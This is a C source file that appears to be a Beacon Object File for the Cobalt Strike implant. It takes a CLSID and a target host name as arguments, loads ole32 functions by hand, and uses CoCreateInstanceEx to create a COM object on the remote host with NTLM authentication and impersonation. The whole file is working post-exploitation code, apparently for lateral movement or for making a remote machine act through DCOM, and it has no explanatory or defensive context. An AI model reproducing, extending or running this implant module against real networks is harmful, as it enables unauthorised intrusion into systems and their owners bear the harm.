#include "include.h"

typedef struct
{
    struct {
        D_API( GetProcessHeap );
        D_API( HeapAlloc );
        D_API( HeapFree );

    } kernel32;

    struct {
        D_API( CoInitializeEx );
        D_API( CLSIDFromString );
        D_API( CoCreateInstanceEx );
        D_API( CoUninitialize );

    } ole32;

} API ;

VOID Go( PVOID Argv, INT Argc )
{
    GUID xIID_IDispatch = { 0x00020400, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };

    API                 Api;
    datap               Psr;

    HANDLE              hKernel32 = NULL;
    HANDLE              hOle32 = NULL;

    LPOLESTR            pClsid = NULL;
    LPOLESTR            pTarget = NULL;

    IID                 iid;
    MULTI_QI            mqi[1];
    HRESULT             hr = S_OK;
    COSERVERINFO*       pServer = NULL;
    COAUTHINFO*         pAuth = NULL;

    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Psr, sizeof( Psr ) );
    
    BeaconDataParse( &Psr, Argv, Argc );
    pClsid = C_PTR( BeaconDataExtract( &Psr, NULL ) );
    pTarget = C_PTR( BeaconDataExtract( &Psr, NULL ) );
    if( pClsid == NULL || pTarget == NULL )
    {
        BeaconPrintf( CALLBACK_ERROR, "Failed to read arguments" );
        return;
    };

    hKernel32 = LoadLibraryA( "kernel32.dll" );
    hOle32 = LoadLibraryA( "ole32.dll" );
    if( hKernel32 == NULL || hOle32 == NULL )
    {
        BeaconPrintf( CALLBACK_ERROR, "Failed to load libraries" );
        return;
    };

    Api.kernel32.GetProcessHeap     = C_PTR( GetProcAddress( hKernel32, "GetProcessHeap" ) );
    Api.kernel32.HeapAlloc          = C_PTR( GetProcAddress( hKernel32, "HeapAlloc" ) );
    Api.kernel32.HeapFree           = C_PTR( GetProcAddress( hKernel32, "HeapFree" ) );
    Api.ole32.CoInitializeEx        = C_PTR( GetProcAddress( hOle32, "CoInitializeEx" ) );
    Api.ole32.CLSIDFromString       = C_PTR( GetProcAddress( hOle32, "CLSIDFromString" ) );
    Api.ole32.CoCreateInstanceEx    = C_PTR( GetProcAddress( hOle32, "CoCreateInstanceEx" ) );
    Api.ole32.CoUninitialize        = C_PTR( GetProcAddress( hOle32, "CoUninitialize" ) );
    if( Api.kernel32.GetProcessHeap == NULL ||
        Api.kernel32.HeapAlloc == NULL ||
        Api.kernel32.HeapFree == NULL ||
        Api.ole32.CoInitializeEx == NULL ||
        Api.ole32.CLSIDFromString == NULL ||
        Api.ole32.CoCreateInstanceEx == NULL ||
        Api.ole32.CoUninitialize == NULL )
    {
        BeaconPrintf( CALLBACK_ERROR, "Failed to resolve APIs" );
        return;
    };

    hr = Api.ole32.CoInitializeEx( NULL, COINIT_APARTMENTTHREADED );
    if ( FAILED( hr ) )
    {
        BeaconPrintf( CALLBACK_ERROR, "CoInitialize failed: 0x%08lx", hr );
        return;
    };

    hr = Api.ole32.CLSIDFromString( pClsid, &iid );
    if ( FAILED( hr ) )
    {
        BeaconPrintf( CALLBACK_ERROR, "CLSIDFromString failed: 0x%08lx", hr );
        Api.ole32.CoUninitialize();
        return;
    };

    mqi->hr = hr;
    mqi->pIID = &xIID_IDispatch;
    mqi->pItf = NULL;

    pServer = Api.kernel32.HeapAlloc( Api.kernel32.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( COSERVERINFO ) );
    pAuth = Api.kernel32.HeapAlloc( Api.kernel32.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( COAUTHINFO ) );
    if( pServer == NULL || pAuth == NULL )
    {
        BeaconPrintf( CALLBACK_ERROR, "Failed to allocate memory" );
        Api.ole32.CoUninitialize();
        return;
    };

    pAuth->dwAuthnSvc = RPC_C_AUTHN_WINNT;
    pAuth->dwAuthzSvc = RPC_C_AUTHZ_NONE;
    pAuth->pwszServerPrincName = NULL;
    pAuth->dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
    pAuth->dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
    pAuth->pAuthIdentityData = NULL;
    pAuth->dwCapabilities = EOAC_NONE;

    pServer->dwReserved1 = 0;
    pServer->dwReserved2 = 0;
    pServer->pwszName = pTarget;
    pServer->pAuthInfo = pAuth;
    
    BeaconPrintf( CALLBACK_OUTPUT, "Instantiating the COM object..." );
    Api.ole32.CoCreateInstanceEx( &iid, NULL, CLSCTX_REMOTE_SERVER, pServer, 1, mqi );
    Api.ole32.CoUninitialize();
    Api.kernel32.HeapFree( Api.kernel32.GetProcessHeap(), 0, pServer );
    Api.kernel32.HeapFree( Api.kernel32.GetProcessHeap(), 0, pAuth );

    return;
};
